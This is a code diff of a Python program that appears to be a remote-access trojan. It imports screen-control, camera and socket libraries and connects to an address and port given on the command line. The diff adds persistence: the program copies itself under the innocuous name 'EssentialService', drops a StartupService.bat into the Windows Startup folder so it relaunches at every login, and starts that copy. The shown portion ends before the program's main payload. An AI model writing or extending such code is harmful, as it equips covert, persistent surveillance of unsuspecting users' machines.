@@ -6,26 +6,45 @@ import pyautogui
 import sys
 import cv2
 
-ADDR = socket.gethostbyname(socket.gethostname())
-PORT = 80
+# FILE SETUP SECTION
 
-NEW_FILE_NAME = 'EssentialService.exe'
+ADDR = sys.argv[1]
+PORT = int(sys.argv[2])
+
+FILE_NAME = os.path.basename(sys.argv[0])
+
+FILE_TYPE = FILE_NAME.split('.')[-1]
+
+NEW_FILE_NAME = f'EssentialService.{FILE_TYPE}'
 
 STARTUP_PATH_ON_DEVICE = os.path.join(os.getenv('APPDATA'),  r'Microsoft\Windows\Start Menu\Programs\Startup')
 
-CURRENT_PATH_TO_FILE = os.path.dirname(__file__)
+NEW_EXE_PATH = os.path.abspath(os.path.join(STARTUP_PATH_ON_DEVICE, '..'))
 
-if STARTUP_PATH_ON_DEVICE != CURRENT_PATH_TO_FILE:
+CURRENT_PATH_TO_FILE = os.path.dirname(FILE_NAME)
 
-    with open(os.path.join(CURRENT_PATH_TO_FILE, __file__), 'rb') as f:
+# IF FILE IS NOT RUNNING IN PERSISTENCE AREA AND THERE'S NOT ALREADY A FILE THERE
+
+if NEW_EXE_PATH != CURRENT_PATH_TO_FILE and not os.path.exists(os.path.join(STARTUP_PATH_ON_DEVICE, NEW_FILE_NAME)):
+
+    with open(os.path.join(CURRENT_PATH_TO_FILE, FILE_NAME), 'rb') as f:
         fileData = f.read()
 
-    with open(os.path.join(STARTUP_PATH_ON_DEVICE, NEW_FILE_NAME), 'wb') as f:
+    with open(os.path.join(NEW_EXE_PATH, NEW_FILE_NAME), 'wb') as f:
         f.write(fileData)
+
+    with open(os.path.join(STARTUP_PATH_ON_DEVICE, 'StartupService.bat'), 'w') as f:
+        f.write(f'cd "{NEW_EXE_PATH}"\nstart {NEW_FILE_NAME} {sys.argv[1]} {sys.argv[2]}\nexit')
+
+    print(f'start /MIN {os.path.join(STARTUP_PATH_ON_DEVICE, "StartupService.bat")}')
+
+    os.chdir(STARTUP_PATH_ON_DEVICE)
     
-    os.remove(os.path.join(CURRENT_PATH_TO_FILE, __file__))
-    os.startfile(os.path.join(STARTUP_PATH_ON_DEVICE, NEW_FILE_NAME))
+    os.system('start StartupService.bat')
+
     sys.exit()
+
+# ONCE FILE IN PERSISTENCE AREA START PROGRAM
 
 os.chdir(os.getenv('USERPROFILE'))
 
